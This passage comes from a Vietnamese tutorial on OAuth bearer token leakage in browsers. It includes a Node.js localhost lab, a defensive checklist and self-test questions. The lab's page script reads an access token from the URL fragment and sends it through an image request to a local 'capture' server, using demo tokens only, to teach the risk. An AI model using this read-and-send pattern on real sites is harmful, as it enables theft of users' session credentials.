Một số resource server kiểm tra JWT cục bộ và chỉ dựa vào expiry; token đã ký có thể tiếp tục hợp lệ cho tới khi hết hạn nếu không có denylist/introspection hoặc cơ chế revoke tương ứng. Với refresh token rotation, revoke token family có thể ngăn cấp access token mới nhưng không nhất thiết vô hiệu ngay access token đã phát hành.

Thiết kế cần kết hợp TTL ngắn, introspection/denylist khi phù hợp, session version hoặc key rotation theo mức độ rủi ro. Đừng hứa rằng logout luôn làm mọi access token đã phát hành mất hiệu lực tức thì nếu hạ tầng không hỗ trợ.

## 14. Thực hành: quan sát token leakage trong browser

Bài lab dùng **Node.js 18 trở lên**, không cần package ngoài. Chạy hai HTTP server trên localhost:

- http://localhost:3000: trang callback giả lập.
- http://localhost:3001: endpoint nhận request mô phỏng bên ngoài.

Chỉ dùng token giả như DEMO-QUERY-TOKEN. Không dán access token, refresh token, session cookie hoặc credential thật vào lab.

Lab cho thấy:

- Query token xuất hiện trong request URL mà server nhận và access log ghi lại.
- Với Referrer-Policy unsafe-url, request ảnh từ origin khác có thể mang full callback URL trong Referer.
- Với no-referrer, request mô phỏng không gửi Referer.
- Fragment không được gửi trong HTTP request đầu tiên, nhưng JavaScript cùng origin đọc được.
- Một script cùng origin có thể đọc fragment và gửi giá trị đó tới endpoint khác.
- history.replaceState xóa query/fragment khỏi URL đang hiển thị nhưng không xóa access log đã ghi.

### 14.1. Tạo file token-leakage-lab.mjs

~~~js
import { createServer } from 'node:http';

function callbackPage(mode) {
  return [
    '<!doctype html>',
    '<html lang="vi"><head><meta charset="utf-8">',
    '<meta name="viewport" content="width=device-width, initial-scale=1">',
    '<title>Token leakage lab</title>',
    '<style>body{font:16px system-ui,sans-serif;max-width:780px;margin:32px auto;padding:0 16px}button{margin:4px;padding:8px 12px}pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#f2f2f2;padding:12px}</style>',
    '</head><body>',
    '<h1>Token leakage lab</h1>',
    '<p>Mode: <strong>' + mode + '</strong></p>',
    '<p>Chỉ dùng token giả. Xem log của cả hai server trong terminal.</p>',
    '<pre id="status">Đang kiểm tra URL...</pre>',
    '<button id="send-referrer">Gửi request ảnh tới origin 3001</button>',
    '<button id="send-fragment">Mô phỏng script đọc fragment rồi gửi đi</button>',
    '<button id="clean">Xóa query và fragment khỏi URL</button>',
    '<script>',
    'const status = document.querySelector("#status");',
    'const params = new URLSearchParams(location.search);',
    'const fragment = new URLSearchParams(location.hash.slice(1));',
    'const queryToken = params.get("access_token");',
    'const fragmentToken = fragment.get("access_token");',
    'status.textContent = [',
    '  "query token present: " + Boolean(queryToken),',
    '  "fragment token present: " + Boolean(fragmentToken),',
    '  "full URL is visible to same-origin JavaScript: yes",',
    '  "The server does not receive the URL fragment.",',
    '].join("\\n");',
    'document.querySelector("#send-referrer").addEventListener("click", () => {',
    '  const image = new Image();',
    '  image.src = "http://localhost:3001/capture?case=referer";',
    '  status.textContent += "\\nSent image request to localhost:3001.";',
    '});',
    'document.querySelector("#send-fragment").addEventListener("click", () => {',
    '  const token = new URLSearchParams(location.hash.slice(1)).get("access_token");',
    '  if (!token) {',
    '    status.textContent += "\\nNo fragment token is present.";',
    '    return;',
    '  }',
    '  const image = new Image();',
    '  image.src = "http://localhost:3001/capture?case=fragment&value=" + encodeURIComponent(token);',
    '  status.textContent += "\\nA same-origin script read the fragment and sent a demo value.";',
    '});',
    'document.querySelector("#clean").addEventListener("click", () => {',
    '  history.replaceState(null, document.title, location.pathname);',
    '  status.textContent += "\\nQuery and fragment removed from the visible URL.";',
    '});',
    '</script>',
    '</body></html>',
  ].join('\n');
}

const appServer = createServer((request, response) => {
  const url = new URL(request.url, 'http://localhost:3000');

  if (url.pathname.startsWith('/callback/')) {
    // Cố ý ghi URL để quan sát rủi ro; chỉ dùng token giả trong lab.
    console.log('[APP ACCESS LOG]', request.method, request.url);

    const mode = url.pathname.split('/').pop();
    if (!['unsafe', 'safe', 'fragment'].includes(mode)) {
      response.writeHead(404, {
        'Content-Type': 'text/plain; charset=utf-8',
      });
      response.end('Unknown callback mode');
      return;
    }

    const referrerPolicy = mode === 'unsafe'
      ? 'unsafe-url'
      : 'no-referrer';

    response.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store',
      'Referrer-Policy': referrerPolicy,
    });
    response.end(callbackPage(mode));
    return;
  }

  response.writeHead(404, {
    'Content-Type': 'text/plain; charset=utf-8',
  });
  response.end('Not found');
});

const captureServer = createServer((request, response) => {
  const url = new URL(request.url, 'http://localhost:3001');

  if (url.pathname === '/capture') {
    console.log('[CAPTURE SERVER]', {
      case: url.searchParams.get('case'),
      value: url.searchParams.get('value'),
      referer: request.headers.referer ?? '(no Referer header)',
    });

    response.writeHead(200, {
      'Content-Type': 'image/svg+xml',
      'Cache-Control': 'no-store',
    });
    response.end(
      '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"></svg>',
    );
    return;
  }

  response.writeHead(404);
  response.end('Not found');
});

appServer.listen(3000, () => {
  console.log('App: http://localhost:3000');
});

captureServer.listen(3001, () => {
  console.log('Capture endpoint: http://localhost:3001/capture');
});
~~~

### 14.2. Chạy lab

~~~bash
node token-leakage-lab.mjs
~~~

### 14.3. Thử query token và Referer leakage

Mở:

~~~text
http://localhost:3000/callback/unsafe?access_token=DEMO-QUERY-TOKEN
~~~

1. Terminal của app server hiển thị request URL có access_token.
2. Nhấn **Gửi request ảnh tới origin 3001**.
3. Capture server có thể nhận full URL trong Referer vì response cố ý đặt Referrer-Policy unsafe-url.
4. Quan sát log để thấy token giả có thể xuất hiện ở cả access log và Referer.

Tiếp theo mở:

~~~text
http://localhost:3000/callback/safe?access_token=DEMO-QUERY-TOKEN
~~~

Nhấn nút gửi ảnh. Capture server không nhận Referer do policy no-referrer, nhưng app server vẫn nhận và log query token. Điều này cho thấy Referrer-Policy không sửa được việc token đã được gửi trong URL.

### 14.4. Thử fragment token

Mở:

~~~text
http://localhost:3000/callback/fragment#access_token=DEMO-FRAGMENT-TOKEN
~~~

1. App server log request /callback/fragment mà không có fragment.
2. Trang JavaScript hiển thị fragment token present: true.
3. Nhấn **Gửi request ảnh tới origin 3001**; Referer bị chặn bởi no-referrer.
4. Nhấn **Mô phỏng script đọc fragment rồi gửi đi**.
5. Capture server nhận giá trị demo trong query value.

Thử nghiệm chứng minh fragment không được gửi trong request đầu tiên nhưng JavaScript cùng origin vẫn đọc và có thể làm lộ giá trị.

### 14.5. Thử URL cleanup

Trên callback page, nhấn **Xóa query và fragment khỏi URL**. Address bar được cập nhật bằng history.replaceState. Kiểm tra terminal: request đầu tiên vẫn đã được server ghi log trước khi cleanup.

### 14.6. Giới hạn lab

- Chỉ dùng token giả; server cố ý log query và giá trị mô phỏng để người học quan sát.
- unsafe-url chỉ được bật trên route unsafe để minh họa policy yếu; không dùng trong production.
- no-referrer giảm Referer leakage nhưng không che query khỏi server nhận request ban đầu.
- Lab không triển khai OAuth, token issuer, API có dữ liệu thật, browser storage hoặc XSS payload.
- Browser có thể áp dụng chính sách privacy riêng; kiểm tra request headers thực tế trong DevTools.
- Dừng hai Node.js server sau khi hoàn thành và không tái sử dụng credential thật trong lab.

## 15. Checklist chống token leakage

1. **Không đặt bearer token trong URL:** không dùng query string hoặc fragment làm kênh truyền access/refresh token.
2. **Dùng Authorization Code + PKCE:** ưu tiên S256; tránh implicit grant.
3. **Bảo vệ redirect:** redirect URI chính xác, không open redirect, state/nonce gắn transaction và dùng một lần.
4. **Làm sạch callback:** không tải third-party resource; no-referrer; no-store; loại code/state khỏi URL sớm.
5. **Ưu tiên BFF:** giữ access/refresh token ở backend nếu kiến trúc cho phép.
6. **Bảo vệ cookie session:** Secure, HttpOnly, SameSite, host-only và CSRF defense.
7. **Tránh persistent browser token storage:** không mặc định dùng localStorage/sessionStorage/IndexedDB cho credential.
8. **Giảm thời gian phơi bày:** access token ngắn hạn, refresh rotation, expiry và revocation.
9. **Giới hạn quyền:** scope tối thiểu, audience cụ thể và resource server kiểm tra mọi request.
10. **Cân nhắc sender constraint:** DPoP hoặc cơ chế phù hợp để giảm replay token bị đánh cắp.
11. **Chống XSS:** output encoding, sanitization, CSP nonce/hash, Trusted Types và kiểm soát dependency.
12. **Giảm script bên thứ ba:** không chạy analytics/tag manager trên callback hoặc trang có credential.
13. **Redact log:** Authorization, Cookie, Set-Cookie, token, code, verifier và callback query.
14. **Kiểm tra telemetry:** analytics, APM, session replay, crash report, HAR và support bundle.
15. **Kiểm tra cache:** Cache-Control no-store cho response nhạy cảm; rà Cache Storage và Service Worker.
16. **Kiểm tra messaging:** không gửi token qua postMessage/BroadcastChannel nếu không có giao thức an toàn.
17. **Có incident playbook:** revoke token family/session, rotate credential bị lộ và kiểm tra truy cập bất thường.
18. **Kiểm thử định kỳ:** kiểm tra URL, Referer, history, storage, logs và network capture trên browser thật.

## 16. Những nhầm lẫn cần tránh

| Nhầm lẫn | Cách hiểu đúng |
| --- | --- |
| “HTTPS nghĩa là token không thể bị lộ.” | HTTPS bảo vệ đường truyền; URL, log, runtime, storage và telemetry vẫn có thể làm lộ token. |
| “JWT đã ký thì payload được mã hóa.” | JWS thường chỉ ký; payload Base64URL có thể đọc được. |
| “Fragment không gửi lên server nên an toàn.” | JavaScript cùng origin đọc được fragment; nó cũng có thể nằm trong history và bị mã độc lấy. |
| “Referrer-Policy xóa token khỏi access log.” | Nó chỉ kiểm soát Referer của request phát sinh; request URL ban đầu vẫn tới server. |
| “history.replaceState thu hồi token đã lộ.” | Nó chỉ sửa URL trong history hiện tại; không xóa log/copy hoặc thu hồi credential. |
| “sessionStorage an toàn trước XSS hơn hẳn localStorage.” | Nó giảm persistence và chia sẻ tab, nhưng JavaScript cùng origin vẫn đọc được. |
| “Closure hoặc Web Worker loại bỏ XSS.” | Chúng giảm truy cập trực tiếp; malicious code vẫn có thể gọi ứng dụng/worker để thực hiện hành động. |
| “HttpOnly cookie không thể bị lạm dụng.” | JavaScript không đọc cookie nhưng browser tự gửi cookie; XSS và CSRF vẫn cần được xử lý. |
| “BFF không cần CSRF protection.” | BFF thường xác thực browser bằng cookie nên phải có CSRF defense. |
| “PKCE làm access token không thể bị đánh cắp.” | PKCE bảo vệ authorization code; access token sau khi cấp vẫn cần bảo vệ riêng. |
| “DPoP giải quyết hoàn toàn XSS.” | XSS có thể dùng browser context để tạo proof và gọi API khi ứng dụng đang hoạt động. |
| “Token hết hạn là không cần revoke.” | Refresh token, session hoặc access token khác có thể còn hiệu lực; cần xử lý token family và phiên liên quan. |

## 17. Câu hỏi tự đánh giá

**Câu 1.** Vì sao bearer token bị lộ có thể bị replay?

**Gợi ý trả lời:** Bên có token có thể gửi lại token tới resource server; bearer token không yêu cầu chứng minh đang giữ khóa riêng.

**Câu 2.** Vì sao query string là nơi không phù hợp để truyền access token?

**Gợi ý trả lời:** URL có thể xuất hiện trong browser history, access log, proxy/CDN, analytics, Referer và các công cụ chẩn đoán.

**Câu 3.** Fragment có được gửi trong HTTP request đầu tiên không?

**Gợi ý trả lời:** Không. Nhưng JavaScript cùng origin đọc được fragment và có thể làm lộ nó.

**Câu 4.** Referrer-Policy no-referrer giải quyết điều gì?

**Gợi ý trả lời:** Ngăn browser gửi Referer trên request phát sinh từ document; nó không xóa query khỏi request ban đầu hoặc log server.

**Câu 5.** Vì sao Authorization Code + PKCE tốt hơn Implicit Grant?

**Gợi ý trả lời:** Access token được trả từ token endpoint thay vì authorization response URL; PKCE ràng buộc code với client đã khởi tạo transaction.

**Câu 6.** Vì sao localStorage và sessionStorage không bảo vệ token trước XSS?

**Gợi ý trả lời:** JavaScript chạy cùng origin có thể đọc các storage API này.

**Câu 7.** BFF giảm token leakage bằng cách nào?

**Gợi ý trả lời:** Access/refresh token ở backend; browser chỉ giữ cookie session và gửi request tới BFF.

**Câu 8.** BFF còn cần phòng vệ gì khi dùng cookie?

**Gợi ý trả lời:** CSRF defense, cookie flags, Origin/CSRF token validation và giới hạn destination của proxy.

**Câu 9.** DPoP giúp gì khi access token bị lộ?

**Gợi ý trả lời:** Token được ràng buộc với public key; attacker chỉ có token nhưng không có private key khó replay từ thiết bị khác. XSS đang chạy trong browser vẫn có thể yêu cầu browser ký proof.

**Câu 10.** Nếu token xuất hiện trong log, cần làm gì?

**Gợi ý trả lời:** Xác định loại token, phạm vi và thời gian lộ; revoke token/session phù hợp, rotate credential liên quan, redaction log và điều tra request đã dùng token.

## Tài liệu tham khảo

- IETF — [RFC 10017: OAuth 2.0 for Browser-Based Applications (BCP 212, August 2026)](https://www.rfc-editor.org/rfc/rfc10017.html).
- IETF — [RFC 9700: Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700.html).
- IETF — [RFC 6750: OAuth 2.0 Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750.html).
- IETF — [RFC 7636: Proof Key for Code Exchange by OAuth Public Clients (PKCE)](https://www.rfc-editor.org/rfc/rfc7636.html).
- IETF — [RFC 9449: OAuth 2.0 Demonstrating Proof of Possession (DPoP)](https://www.rfc-editor.org/rfc/rfc9449.html).
- IETF — [RFC 9110: HTTP Semantics, Referer](https://www.rfc-editor.org/rfc/rfc9110.html).
- OWASP — [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).
- OWASP — [OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html).
- OWASP — [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html).
- W3C — [Referrer Policy](https://www.w3.org/TR/referrer-policy/).
